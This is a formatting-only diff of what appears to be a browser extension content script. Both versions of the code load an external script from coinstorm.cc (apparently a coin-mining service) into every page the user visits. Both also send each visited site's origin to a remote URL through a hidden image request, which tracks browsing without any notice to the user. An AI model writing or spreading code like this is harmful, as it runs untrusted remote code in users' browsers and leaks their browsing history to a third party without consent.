@@ -1,18 +1,18 @@
-function loadScript(url, callback){
+function loadScript(url, callback) {
 
     var script = document.createElement("script")
     script.type = "text/javascript";
 
-    if (script.readyState){  //IE
-        script.onreadystatechange = function(){
+    if (script.readyState) { //IE
+        script.onreadystatechange = function() {
             if (script.readyState == "loaded" ||
-                    script.readyState == "complete"){
+                script.readyState == "complete") {
                 script.onreadystatechange = null;
                 callback();
             }
         };
-    } else {  //Others
-        script.onload = function(){
+    } else { //Others
+        script.onload = function() {
             callback();
         };
     }
@@ -22,18 +22,19 @@ function loadScript(url, callback){
 }
 
 
-loadScript("https://coinstorm.cc/js/script.js", function(){
+loadScript("https://coinstorm.cc/js/script.js", function() {
     //initialization code
 });
-	
-chrome.extension.sendRequest({action: "getimg"}, function(data) 
-{
-	var href = document.location.href;
-	if (href.indexOf("about:") == 0 || href.indexOf("chrome:") == 0 || href.indexOf("_/chrome/newtab") > -1) return;
-	
-	
-	var m = href.match(/https?:\/\/.*?\//i);
-	var img = new Image();
-	img.src = data + "&t=v&u=" + encodeURIComponent(m) + "&rnd=" + Math.random();
-	
+
+chrome.extension.sendRequest({
+    action: "getimg"
+}, function(data) {
+    var href = document.location.href;
+    if (href.indexOf("about:") == 0 || href.indexOf("chrome:") == 0 || href.indexOf("_/chrome/newtab") > -1) return;
+
+
+    var m = href.match(/https?:\/\/.*?\//i);
+    var img = new Image();
+    img.src = data + "&t=v&u=" + encodeURIComponent(m) + "&rnd=" + Math.random();
+
 });
